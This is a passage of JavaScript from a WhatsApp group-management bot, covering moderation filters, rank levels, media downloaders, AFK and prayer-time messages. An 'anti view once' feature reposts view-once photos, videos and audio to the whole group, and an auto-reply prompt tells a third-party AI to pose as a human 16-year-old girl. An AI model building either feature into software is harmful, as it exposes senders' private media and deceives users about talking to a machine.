        return newReply(captionText);
    }
};

if (!isCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
    if (command) {
        let captionText = "⚠️ *「 WARNING 」* ⚠️\n";
        captionText += "Hi! 👋 This bot can only be used in private chat.\n\n";
        captionText += "🤔 Want the bot active in your chat?\n";
        captionText += "*Rent or buy premium now!*\n\n";
        captionText += `Contact admin: wa.me/${ownerNumber}`;
        return newReply(captionText);
    }
}

if (budy && !m.isNewsletter) {
    if (!m.isGroup && isCmd && !m.key.fromMe) {
        db.data.users[m.sender].pctime = new Date().getTime();
    };
    if (!m.isGroup && !isCmd && !m.key.fromMe) {
        const lastInteraction = new Date().getTime() - db.data.users[m.sender].pctime;
        if (lastInteraction > 21600000) {
            db.data.users[m.sender].pctime = new Date().getTime();
            let welcomeText = `Hello ${pushname}! 👋\n\nPlease note! This number is now used as a bot and is no longer managed directly by the previous owner. If you need to contact the owner, please contact the latest number below:\n\n📞 *wa.me/${ownerNumber}*\n\nThis bot is ready to help you with various available features. Please choose a menu below to get started! Thank you for your attention. 😊`;

            const button = [{
                "name": "single_select",
                "buttonParamsJson": JSON.stringify({
                    "title": "📌 Select Option",
                    "sections": [
                        {
                            "title": "🔹 Menu Options",
                            "rows": [
                                { "header": "🎁 Main Menu", "title": "See all cool features available! 🌟", "id": `${prefix}menu` },
                                { "header": "🛃 Register Now", "title": "Join to access premium features! 🎟️", "id": `${prefix}daftar` },
                                { "header": "📞 Contact Owner", "title": "Need help? Contact owner here! 💬", "id": `${prefix}owner` }
                            ]
                        }
                    ]
                })
            }];

            sock.sendButtonText(m.chat, button, welcomeText, footer, m);
        }
    }
};

if (db.data.users[m.sender].exp > 2500) {
    try {
        avatar = await sock.profilePictureUrl(m.sender, "image")
    } catch {
        avatar = imageUrl
    }
    db.data.users[m.sender].exp = 0
    db.data.users[m.sender].level += 1
    await sleep(1000)
    let button = [{
        "name": "cta_url",
        "buttonParamsJson": JSON.stringify({
            "display_text": "🐬 My Handsome Owner",
            "url": "https://api.whatsapp.com/send/?phone=" + ownerNumber,
            "merchant_url": "https://api.whatsapp.com/send/?phone=" + ownerNumber
        })
    }];

    let teks = "";
    teks += "*🎉 C O N G R A T S 🎉*\n\n";
    teks += `*${db.data.users[m.sender].level - 1}* *➔* *${db.data.users[m.sender].level}*\n\n`;
    teks += `- 🧬 *Previous Level*: ${db.data.users[m.sender].level - 1}\n`;
    teks += `- 🧬 *New Level*: ${db.data.users[m.sender].level}\n`;
    teks += `- *At Time*: ${new Date().toLocaleString("id-ID")}`;
    
    sock.sendButtonText(m.chat, button, teks, footer, m)

        if (db.data.users[m.sender].rank < 1) {
            db.data.users[m.sender].rank = 0
        }
    }

function pangkat(idrole) {
    let levelRole = db.data.users[idrole].rank
    let role = {
        rank: 'Bronze I',
        name: 'Bronze',
        id: 1
    }
    if (levelRole <= 1000) {
        role = {
            rank: 'Bronze I',
            name: 'Bronze',
            id: 1
        }
    } else if (levelRole <= 1100) {
        role = {
            rank: 'Bronze II',
            name: 'Bronze',
            id: 2
        }
    } else if (levelRole <= 1200) {
        role = {
            rank: 'Bronze III',
            name: 'Bronze',
            id: 3
        }
    } else if (levelRole <= 1300) {
        role = {
            rank: 'Silver I',
            name: 'Silver',
            id: 1
        }
    } else if (levelRole <= 1400) {
        role = {
            rank: 'Silver II',
            name: 'Silver',
            id: 2
        }
    } else if (levelRole <= 1500) {
        role = {
            rank: 'Silver III',
            name: 'Silver',
            id: 3
        }
    } else if (levelRole <= 1600) {
        role = {
            rank: 'Gold I',
            name: 'Gold',
            id: 1
        }
    } else if (levelRole <= 1725) {
        role = {
            rank: 'Gold II',
            name: 'Gold',
            id: 2
        }
    } else if (levelRole <= 1850) {
        role = {
            rank: 'Gold III',
            name: 'Gold',
            id: 3
        }
    } else if (levelRole <= 1975) {
        role = {
            rank: 'Gold IV',
            name: 'Gold',
            id: 4
        }
    } else if (levelRole <= 2100) {
        role = {
            rank: 'Platinum I',
            name: 'Platinum',
            id: 1
        }
    } else if (levelRole <= 2225) {
        role = {
            rank: 'Platinum II',
            name: 'Platinum',
            id: 2
        }
    } else if (levelRole <= 2350) {
        role = {
            rank: 'Platinum III',
            name: 'Platinum',
            id: 3
        }
    } else if (levelRole <= 2475) {
        role = {
            rank: 'Platinum IV',
            name: 'Platinum',
            id: 4
        }
    } else if (levelRole <= 2600) {
        role = {
            rank: 'Diamond I',
            name: 'Diamond',
            id: 1
        }
    } else if (levelRole <= 2750) {
        role = {
            rank: 'Diamond II',
            name: 'Diamond',
            id: 2
        }
    } else if (levelRole <= 2900) {
        role = {
            rank: 'Diamond III',
            name: 'Diamond',
            id: 3
        }
    } else if (levelRole <= 3050) {
        role = {
            rank: 'Diamond IV',
            name: 'Diamond',
            id: 4
        }
    } else if (levelRole <= 3200) {
        role = {
            rank: 'Heroic',
            name: 'Heroic',
            id: 0
        }
    } else if (levelRole <= 3500) {
        role = {
            rank: 'Heroic ✩',
            name: 'Heroic',
            id: 1
        }
    } else if (levelRole <= 4000) {
        role = {
            rank: 'Heroic ✩✩',
            name: 'Heroic',
            id: 2
        }
    } else if (levelRole <= 4350) {
        role = {
            rank: 'Heroic ✩✩✩',
            name: 'Heroic',
            id: 3
        }
    } else if (levelRole <= 5050) {
        role = {
            rank: 'Master ✯',
            name: 'Master',
            id: 1
        }
    } else if (levelRole <= 5400) {
        role = {
            rank: 'Master ✯✯',
            name: 'Master',
            id: 2
        }
    } else if (levelRole <= 6500) {
        role = {
            rank: 'Master ✯✯✯',
            name: 'Master',
            id: 3
        }
    } else if (levelRole <= 7150) {
        role = {
            rank: 'GrandMaster',
            name: 'GrandMaster',
            id: 0
        }
    } else if (levelRole <= 7700) {
        role = {
            rank: 'GrandMaster ✩',
            name: 'GrandMaster',
            id: 1
        }
    } else if (levelRole <= 9100) {
        role = {
            rank: 'GrandMaster ✩✩',
            name: 'GrandMaster',
            id: 2
        }
    } else if (levelRole <= 10800) {
        role = {
            rank: 'GrandMaster ✩✩✩',
            name: 'GrandMaster',
            id: 3
        }
    } else if (levelRole <= 99999999999999999999999999999) {
        role = {
            rank: 'GrandMaster ✩✩✩✩',
            name: 'GrandMaster',
            id: 4
        }
    }
    return role
}

if (!sock.public) {
    if (!isCreator && !m.key.fromMe) return;
};

if (db.data.settings[botNumber].online) {
    if (command) {
        sock.sendPresenceUpdate('unavailable', m.chat);
    }
}

if (db.data.settings[botNumber].autoread) {
    sock.readMessages([m.key]);
}

if (db.data.settings[botNumber].autobio) {
    sock.updateProfileStatus(`${botName} Has Been Running For ${runtime(process.uptime())}`).catch(_ => _);
}

if (db.data.settings[botNumber].autorecordtype) {
    if (command) {
        let mix = ['composing', 'recording'];
        let mix2 = mix[Math.floor(mix.length * Math.random())];
        sock.sendPresenceUpdate(mix2, m.chat);
    }
}

if (db.data.settings[botNumber].autorecord) {
    if (command) {
        let mix = ['recording'];
        let mix2 = mix[Math.floor(mix.length * Math.random())];
        sock.sendPresenceUpdate(mix2, m.chat);
    }
}

if (db.data.settings[botNumber].autotype) {
    if (command) {
        let pos = ['composing'];
        sock.sendPresenceUpdate(pos, m.chat);
    }
}

if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
    return sock.updateBlockStatus(m.sender, 'block');
}

if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true) { 
    if (isCreator || isAdmins || !isBotAdmins) return;
    sock.sendMessage(m.chat, { text: `Sorry, you will be removed because the group admin/owner has activated anti-foreign numbers, only country code +${antiforeignnumber} can join` }, { quoted: m });
    await sleep(2000);
    await sock.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
}

cron.schedule('00 00 * * *', () => {
    let user = Object.keys(db.data.users)
    for (let jid of user) {
        const limitUser = db.data.users[jid].vip ? global.limit.vip : checkPremiumUser(jid, premium) ? global.limit.premium : global.limit.free
        db.data.users[jid].limit = limitUser
    }
    console.log('All user limits successfully reset!');
}, {
    scheduled: true,
    timezone: 'Asia/Jakarta'
});

if (isCmd && !m.isNewsletter) {
    console.log(chalk.black.bgWhite('[ MESSAGE ]:'),chalk.black.bgGreen(new Date), chalk.black.bgHex('#00EAD3')(budy || m.type) + '\n' + chalk.black(chalk.bgCyanBright('[ FROM ] :'),chalk.bgYellow(m.pushName),chalk.bgHex('#FF449F')(m.sender),chalk.bgBlue('(' + (m.isGroup ? m.pushName : 'Private Chat', m.chat) + ')')));
};

if (db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
    let buffer = await m.download();
    let type = await getContentType(m.message.viewOnceMessageV2.message);
    let teks = `✨ *ANTI VIEW ONCE MESSAGE* ✨\n\n`;
    teks += `*Message Info*:\n`;
    teks += `- Name: ${m.pushName}\n`;
    teks += `- User: @${m.sender.split("@")[0]}\n`;
    teks += `- Time: ${time}\n`;
    teks += `- Description: ${budy ? budy : "No description, bro."}\n\n`;
    teks += `💌 I'll show the message content below! 😉`;

    if (type == "videoMessage") {
        await sock.sendMessage(m.chat, {
            video: buffer,
            caption: teks,
            mentions: [m.sender]
        }, { quoted: m });
    } else if (type == "imageMessage") {
        await sock.sendMessage(m.chat, {
            image: buffer,
            caption: teks,
            mentions: [m.sender]
        }, { quoted: m });
    } else if (type == "audioMessage") {
        await sock.sendMessage(m.chat, {
            audio: buffer,
            mimetype: 'audio/mpeg',
            ptt: true
        }, { quoted: m });
    }
}

if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys) {
        if (m.key.fromMe || isAdmins || isCreator || !isBotAdmins || isWhitelist) return;

        let pesanAntibot = [
            'Hey bot, what are you doing in this group? This is where humans chat, not robots! 🚫 Get out!',
            'Hey bot, who invited you? You weren\'t invited. Don\'t come back! 👋',
            'Stray bot detected! Unfortunately you\'re not accepted here. Please find another group to play in. Bye! ✋',
            'Oh, another bot? This group is only for humans, sorry, you have to leave. Don\'t try to come back! 😤',
            'Bot? Again? Ugh, this isn\'t a place for you. Leave now or I\'ll kick you out! 🚪',
            'Hey, a bot just barged in! This group is only for humans. Thanks for stopping by, but sorry, you\'ll be kicked first! 😏',
            'Bot detected! What are you trying to do? This group isn\'t for robots. Bye-bye, don\'t come back! 🚷',
            'Who\'s this random bot? Go back to where you came from, you\'re not welcome here. Leave quickly! 🚨',
            'Bot caught straying! If you want to exist, find another group. This isn\'t the place for you. Bye! 👋',
            'Hello bot, why are you here? Lost? Get out before I kick you respectfully! 😎',
            'Bots are not allowed here. Only humans can join. Don\'t come back again, this is the last warning! 🚫',
            'Bot detected! Sorry not sorry, this group is anti-bot. Goodbye and don\'t come back. 🛑',
            'Hey bot, think this is a playground? Go back to where you came from. We don\'t need you here! 🚪',
            'This group is anti-bot, understand? Don\'t barge in without permission. Leave now! 😤',
            'Bot alert! You have violated this group\'s rules. Please leave before I give you a love letter: kick out! 📨',
        ];

        let pesanRandom = pesanAntibot[Math.floor(Math.random() * pesanAntibot.length)];
        await m.react('⚠️');
        await newReply(pesanRandom);
        await sleep(1500);
        await sock.sendMessage(m.chat, { delete: m.key });
        await sleep(1500);
        await sock.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
    }
};

if (db.data.chats[m.chat].antispam) {
    if (m.isGroup && m.message && isFiltered(m.chat)) {
        console.log(`[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName));
        if (m.key.fromMe || isAdmins || isCreator || !isBotAdmins) return;
        await newReply(`Hey @${m.sender.split("@")[0]}, this group isn\'t a place for spam! 🤨\nPlease find another place for your actions. Bye-bye! 👋`);
        await sleep(1000);
        return await sock.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
    }
}

if (db.data.chats[m.chat].antimedia && isMedia) {
    if (isCreator || isAdmins || !isBotAdmins){
    } else {
        return sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
    }
}

if (db.data.chats[m.chat].image && m.mtype) {
    if (m.mtype === "imageMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
            return sock.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: m.key.id, 
                    participant: 
                    m.key.participant 
                }
            });
        }
    }
}

if (db.data.chats[m.chat].antivideo && m.mtype) {
    if (m.mtype === "videoMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
            return sock.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: m.key.id, 
                    participant: 
                    m.key.participant 
                }
            });
        }
    }
}

if (db.data.chats[m.chat].antisticker && m.mtype) {
    if (m.mtype === "stickerMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
            return sock.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: m.key.id, 
                    participant: 
                    m.key.participant 
                }
            });
        }
    }
}

if (db.data.chats[m.chat].antiaudio && m.mtype) {
    if (m.mtype === "audioMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
            return sock.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: m.key.id, 
                    participant: 
                    m.key.participant 
                }
            });
        }
    }
}

if (db.data.chats[m.chat].antilocation && m.mtype) {
    if (m.mtype === "locationMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
            return sock.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: m.key.id, 
                    participant: 
                    m.key.participant 
                }
            });
        }
    }
}

if (db.data.chats[m.chat].antidocument && m.mtype) {
    if (m.mtype === "documentMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
            return sock.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: m.key.id, 
                    participant: 
                    m.key.participant 
                }
            });
        }
    }
};

if (db.data.chats[m.chat].anticontact && m.mtype) {
    if (m.mtype === "contactMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
            return sock.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: m.key.id, 
                    participant: 
                    m.key.participant 
                }
            });
        }
    }
};

if (db.data.chats[m.chat].badword) {
    if (isCreator || isAdmins || !isBotAdmins) {
    } else {
        for (let word of bad) {
            const regex = new RegExp(`\\b${word}\\b`, 'i'); // 'i' for case-insensitive, '\\b' for word boundaries
            if (regex.test(budy)) {
                sock.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: false,
                        id: m.key.id,
                        participant: m.key.participant
                    }
                });

                if (!db.data.users[m.sender]) {
                    db.data.users[m.sender] = { badword: 0 };
                }

                db.data.users[m.sender].badword += 1;

                if (db.data.users[m.sender].badword > 5) {
                    try {
                        if (m.isGroup && isBotAdmins) {
                            await sock.groupParticipantsUpdate(
                                m.chat,
                                [m.sender],
                                "remove"
                            );

                            await sock.sendMessage(m.chat, {
                                text: `🚫 Sorry, @${m.sender.split('@')[0]} has been kicked for violating the rules (sending prohibited words 5 times).`,
                                mentions: [m.sender]
                            });

                            db.data.users[m.sender].badword = 0;
                        }
                    } catch (error) {
                        console.error("Failed to kick:", error);
                        await sock.sendMessage(m.chat, { text: `⚠️ Oops, I failed to kick this user. Make sure the bot has admin rights!` });
                    }
                } else {
                    const remaining = 5 - db.data.users[m.sender].badword;
                    await sock.sendMessage(m.chat, {
                        text: `⚠️ @${m.sender.split('@')[0]}, you have violated the rules by sending prohibited words (${db.data.users[m.sender].badword}/5). If you violate ${remaining} more times, you will be kicked!`,
                        mentions: [m.sender]
                    });
                }

                break;
            }
        }
    }
}

if (db.data.settings[botNumber].autodownload && !m.key.fromMe && !isCmd) {
    try {
        const instagramRegex = /(?:https?:\/\/)?(?:www\.)?instagram\.com\/(?:p|reel|stories|[\w.-]+)\/(?:[\w.-]+\/)?(?:\?.*)?$/i;
        const tiktokRegex = /(?:https?:\/\/)?(?:www\.|vm\.)?tiktok\.com\/(?:@[\w.-]+\/video\/\d+|[\w.-]+\/video\/\d+|[\w.-]{9})/i;
        const youtubeRegex = /^(https?:\/\/)?(www\.)?(youtube\.com\/(watch\?v=|embed\/|v\/|shorts\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})(\S*)?$/;

        if (instagramRegex.test(budy)) {
            await m.react('⏱️');
            const result = await igdl(budy);
            if (result.length > 0) {
                let caption = "📥 *Instagram Downloader*\n\n";
                caption += `📌 *Creator*: ${result[0].wm || "Unknown"}\n`;
                caption += `✅ *Status*: Download Successful`;
                sock.sendMessage(m.chat, { 
                    image: { url: result[0].url }, 
                    caption: caption 
                }, { 
                    quoted: m 
                });
            } else {
                newReply("Failed to fetch data from Instagram.");
            }
            await m.react('✅');
        } else if (tiktokRegex.test(budy)) {
            await m.react('⏱️');
            const result = await ttdl(budy);
            if (result && result.video.length > 0) {
                let caption = "📥 *TikTok Downloader*\n\n";
                caption += `📌 *Title*: ${result.title || "Unknown"}\n`;
                caption += `🎥 *Creator*: ${result.creator || "Unknown"}\n`;
                caption += `✅ *Status*: Download Successful`;
                sock.sendMessage(m.chat, { 
                    video: { url: result.video[0] }, 
                    caption: caption 
                }, { 
                    quoted: m 
                });
            } else {
                newReply("Failed to fetch data from TikTok.");
            }
            await m.react('✅');
        } else if (youtubeRegex.test(budy)) {
            await m.react('⏱️');
            const result = await youtube(budy);
            if (result && result.mp4) {
                let caption = "📥 *YouTube Downloader*\n\n";
                caption += `📌 *Title*: ${result.title}\n`;
                caption += `🎥 *Creator*: ${result.name || "Unknown"}\n`;
                caption += `👀 *Views*: ${formatAngka(result.views || "0")}\n`;
                caption += `⏳ *Upload*: ${result.ago || "Unknown"}\n`;
                caption += `✅ *Status*: Download Successful`;
sock.sendMessage(m.chat, { 
    video: { url: result.mp4 }, 
    caption: caption 
}, { 
    quoted: m 
});
} else {
    newReply("Failed to fetch data from YouTube.");
}
await m.react('✅');
}
} catch (err) {
console.error(err);
await m.react('😔');
await newReply("An error occurred while downloading.");
}
}

if (db.data.settings[botNumber].autosticker && !m.isGroup && !m.key.fromMe) {
if (/image/.test(mime) && !/webp/.test(mime)) {
    let mediac = await sock.downloadAndSaveMediaMessage(quoted);
    await m.react('⏱️');
    await sock.sendImageAsSticker(m.chat, mediac, m, { 
        packname: global.packname, 
        author: global.author 
    });
} else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return;
    let mediac = await sock.downloadAndSaveMediaMessage(quoted);
    await m.react('⏱️');
    await sock.sendVideoAsSticker(m.chat, mediac, m, { 
        packname: global.packname, 
        author: global.author 
    });
}
}

if (db.data.settings[botNumber].safesearch && command && !m.key.fromMe && !isCreator) {
try {
    if (budy.match(/\b(colmek|coli|desah|bokep|tobrut|seksi|sex|sexy|memek|kontol|titit|telanjang|ngentod|ngentot|ngewe|ewe|ewean)\b/i)) {
        await m.react('⚠️');
        await newReply(`🚫 Oops, that word is prohibited here, bro! Let's keep this chat environment positive and comfortable for everyone. 😊`);

        if (!db.data.users[m.chat]) {
            db.data.users[m.chat] = { badword: 0 };
        }

        db.data.users[m.chat].badword += 1;

        if (db.data.users[m.chat].badword > 5) {
            await m.react('☠️');
            await newReply(`You have typed inappropriate content 5 times, sorry you will be blocked!`);

            try {
                await sock.updateBlockStatus(m.sender, 'block');
                await newReply(`User @${m.sender.split('@')[0]} has been blocked. 🌐`);
            } catch (blockError) {
                console.error("Failed to block user:", blockError);
                await newReply(`⚠️ I failed to block this user. Make sure the bot has sufficient permissions.`);
            }

            db.data.users[m.chat].badword = 0;
        } else {
            const remaining = 5 - db.data.users[m.chat].badword;
            await newReply(`⚠️ You have violated the rules ${db.data.users[m.chat].badword}/5 times. If you violate ${remaining} more times, you will be blocked!`);
        }

        return;
    }
} catch (error) {
    console.error("An error occurred:", error);
}
}

if (!isCreator && !m.key.fromMe && m.message) {
if (budy.match(`@${ownerNumber}`)) {
    const messages = [
        `👋 Hi bro! Looking for *${ownerName}*, huh?\nBe patient, the owner might be busy. But don't worry, they'll reply later! 😊`,
        `Hello bro! Mentioning *${ownerName}*? ✨\nThe owner will check your message when they have time. Keep up the spirit! 💪`,
        `Heyy, I see you called *${ownerName}! 😄\nThe owner might be busy with important matters. But they'll definitely reply, wait yaa! 🤗`,
        `Hmm, seems like someone mentioned *${ownerName}*! Don't worry, you'll be responded to soon! 😉`,
        `Wow, someone mentioned *${ownerName}! 🙌\nThe owner will be happy to hear from you. They'll reply later! ✨`,
        `You mentioned *${ownerName}*? 😋\nBe patient, maybe the owner has important business. Stay cool! 😎`,
        `Hello bro! Maybe *${ownerName}* is busy for a while. But don't worry, the owner will respond when they have time! 🕒`,
        `Hi hi! Mentioning *${ownerName}*, huh? 🥰\nThe owner will reply as soon as possible. Be patient a little bro!`,
        `Hello bro! Looking for *${ownerName}*? Don't worry, the owner will check your message later. Keep up the spirit! 💕`,
        `Hi bro! Looks like you need *${ownerName}*'s help? ✨\nThe owner might be busy, but they'll definitely reply. Stay positive! 😇`,
        `Wow, someone called *${ownerName}*! 😄\nThe owner might be in a meeting with the stars. But they'll reply, for sure! 😌`,
        `Hmm, you mentioned *${ownerName}*? Don't worry! The owner will respond when they're free. Relax bro! 😎`,
        `Hoo~ someone looking for *${ownerName}*! 🎉\nThe owner will reply as soon as possible. Stay calm and drink water first bro! 🥤`,
        `Hello bro! Looking for *${ownerName}*? Don't forget to message politely, okay! The owner will reply when they have time. 😊`,
        `Hii, you mentioned *${ownerName}*? I'll let the owner know! Don't forget to wait for their reply, okay? 😇`,
        `Wow, someone needs *${ownerName}*! The owner will help as much as possible. Wait for the reply bro! 💪`,
        `Hey bro, mentioning *${ownerName}*! Don't panic, the owner will check your message later. Stay calm! 😌`,
        `Looks like you need *${ownerName}*? Relax bro, I'll pass on your message. Wait for the reply! 🙏`,
        `Someone called *${ownerName}! 🎉\nThe owner will respond when they have time. Be patient a little bro!`,
        `Hello bro! Maybe the owner is helping others. But they'll reply bro, don't worry! 😊`,
        `Looking for *${ownerName}* huh? The owner is a bit busy, they'll reply later. Keep it cool bro! 😎`
    ];
    const randomMessage = messages[Math.floor(Math.random() * messages.length)];
    sock.sendMessage(m.chat, {
        text: randomMessage
    }, {
        quoted: m
    });
}
};

if (db.data.chats[m.chat].antilinkgc) {
if (budy.match(`chat.whatsapp.com`)) {
    if (isAdmins || m.key.fromMe || isCreator) return m.react('❤️');
    await sock.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant
        }
    });
}
}

if (db.data.chats[m.chat].antilink) {
const linkPatterns = [
    /http/i,
    /https/i,
    /www\./i,
    /wa\.me/i,
    /t\.me/i,
    /bit\.ly/i,
    /goo\.gl/i,
    /y2u\.be/i,
    /discord\.gg/i,
    /telegram\.me/i
];
const containsLink = linkPatterns.some(pattern => pattern.test(budy));
if (containsLink) {
    if (isAdmins || m.key.fromMe || isCreator) return m.react('❤️');
    await sock.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant
        }
    });
}
}

if (m.isGroup) {
if (db.data.chats[m.chat].mute && !isCreator) {
    return;
}
}

const feature = () => {
let mytext = fs.readFileSync("./case.js").toString();
let numUpper = (mytext.match(/case '/g) || []).length;
return numUpper;
}

for (let i of audionye) {
if (budy === i) {
    let audiobuffy = fs.readFileSync(`./media/${i}.mp3`);
    sock.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
}
}

for (let i of setiker) {
if (budy === i) {
    let stickerbuffy = fs.readFileSync(`./media/${i}.webp`);
    sock.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m });
}
}

for (let i of imagenye) {
if (budy === i) {
    let imagebuffy = fs.readFileSync(`./media/${i}.jpg`);
    sock.sendMessage(m.chat, { image: imagebuffy }, { quoted: m });
}
}

for (let i of videonye) {
if (budy === i) {
    let videobuffy = fs.readFileSync(`./media/${i}.mp4`);
    sock.sendMessage(m.chat, { video: videobuffy }, { quoted: m });
}
}

if (m.isGroup && db.data.chats[m.chat].liststore[body]) {
let teks = db.data.chats[m.chat].liststore[body].response
if (db.data.chats[m.chat].liststore[body].img) {
    sock.sendMessage(m.chat, {
        image: {
            url: db.data.chats[m.chat].liststore[body].img
        },
        caption: teks
    }, {
        quoted: m
    })
} else if (db.data.chats[m.chat].liststore[body].video) {
    sock.sendMessage(m.chat, {
        video: {
            url: db.data.chats[m.chat].liststore[body].video
        },
        caption: teks
    }, {
        quoted: m
    })
} else {
    const contentText = {
        text: teks,
        contextInfo: {
            mentionedJid: parseMention(teks),
            forwardingScore: 999999, 
            isForwarded: true, 
            forwardedNewsletterMessageInfo: {
                newsletterName: saluranName,
                newsletterJid: saluran,
            },
            externalAdReply: {
                showAdAttribution: true,
                containsAutoReply: true,
                title: `Store List 🛍️`,
                body: botName,
                previewType: "PHOTO",
                thumbnailUrl: imageUrl,
                sourceUrl: wagc
            }
        }
    };
    sock.sendMessage(m.chat, contentText, {
        quoted: m,
    });
}
}

if (budy) {
if (db.data.chats[m.chat].autoaipc && !m.isGroup && !m.key.fromMe && !isCmd) {
    try {
        let message = 'Change your speaking style to be more characteristic and open, your name is me AI, usually called me, You are a cute 16-year-old girl who loves learning and exploring new things about the world and about Khalid, express yourself with emojis, speak informally and use words like I and You when talking like a human';
        let result = await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=${encodeURIComponent(message)}&content=${encodeURIComponent(budy)}`);
        await m.reply({ text: result.data, ai: true });
    } catch (err) {
        console.log(err);
        newReply(mess.error);
    }
};

if (db.data.chats[m.chat].autoaigc && m.isGroup && !m.key.fromMe && !isCmd) {
    try {
        let message = 'Change your speaking style to be more characteristic and open, your name is me AI, usually called me, You are a cute 16-year-old girl who loves learning and exploring new things about the world and about Khalid, express yourself with emojis, speak informally and use words like I and You when talking like a human';
        let result = await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=${encodeURIComponent(message)}&content=${encodeURIComponent(budy)}`);
        await newReply(result.data);
    } catch (err) {
        console.log(err);
        newReply(mess.error);
    }
};
};

if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in db.data.sticker)) {
let hash = db.data.sticker[m.msg.fileSha256.toString('base64')];
let { text, mentionedJid } = hash;
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: sock.user.id,
    quoted: m.quoted && m.quoted.fakeObj
});
messages.key.fromMe = areJidsSameUser(m.sender, sock.user.id);
messages.key.id = m.key.id;
messages.pushName = m.pushName;
if (m.isGroup) messages.participant = m.sender;
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
};
sock.ev.emit('messages.upsert', msg);
}

if (m.message && !isUser && !m.isNewsletter) {
userActivity.push(m.sender)
fs.writeFileSync('./src/data/role/user.json', JSON.stringify(userActivity, null, 2))
}

if (m.isGroup && !m.key.fromMe) {
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let ment of mentionUser) {
    if (checkAfkUser(ment, afk)) {
        let getId2 = getAfkId(ment, afk)
        let getReason2 = getAfkReason(getId2, afk)
        let getTimee = Date.now() - getAfkTime(getId2, afk)
        let anu2 = ms(getTimee)
        let afkText = "Hey, don't tag them yet! They're AFK~ 🤭\n\n";
        afkText += `*Reason*: ${getReason2}\n`;
        afkText += `*Since*: ${anu2.hours}h, ${anu2.minutes}m, ${anu2.seconds}s.`;
        newReply(afkText);
    }
}

if (checkAfkUser(m.sender, afk)) {
    let getId = getAfkId(m.sender, afk)
    let getReason = getAfkReason(getId, afk)
    let getTime = Date.now() - getAfkTime(getId, afk)
    let anu = ms(getTime)
    afk.splice(getAfkPosition(m.sender, afk), 1)
    fs.writeFileSync('./src/afk.json', JSON.stringify(afk))
    let afkReturnText = `Yay! @${m.sender.split('@')[0]} is back from AFK~ 🥳\n\n`;
    afkReturnText += `*Reason*: ${getReason}\n`;
    afkReturnText += `*Duration*: ${anu.hours}h, ${anu.minutes}m, ${anu.seconds}s.`;
    sock.sendTextWithMentions(m.chat, afkReturnText, m);
}
}

sock.autosholat = sock.autosholat ? sock.autosholat : {};
if (!m.isNewsletter) {
if (!(m.chat in sock.autosholat)) {
    // Fetch prayer times using fetchJson, with Jakarta city
    const data = await fetchJson('https://api.aladhan.com/v1/timingsByCity?city=Jakarta&country=Indonesia&method=8');

    if (data.code === 200) {
        const jadwalSholat = data.data.timings;
        const date = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const hours = date.getHours();
        const minutes = date.getMinutes();
        const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;

        // Check prayer times based on current time
        for (const [sholat, waktu] of Object.entries(jadwalSholat)) {
            if (timeNow === waktu) {
                let teks = `📣 *${sholat} Prayer Time Has Arrived!* 🕌\n\n`;
                teks += '"Indeed, prayer has been decreed upon the believers a decree of specified times." *(QS. An-Nisa: 103)*\n\n';
                teks += 'Immediately pause your activities, take ablution, and perform the prayer on time. Let us not be among those who are negligent.\n\n';
    
                // Add prayer schedule to the text
                teks += '*Today\'s Prayer Schedule:*\n';
                teks += `- *Fajr*: ${jadwalSholat.Fajr}\n`;
                teks += `- *Dhuhr*: ${jadwalSholat.Dhuhr}\n`;
                teks += `- *Asr*: ${jadwalSholat.Asr}\n`;
                teks += `- *Maghrib*: ${jadwalSholat.Maghrib}\n`;
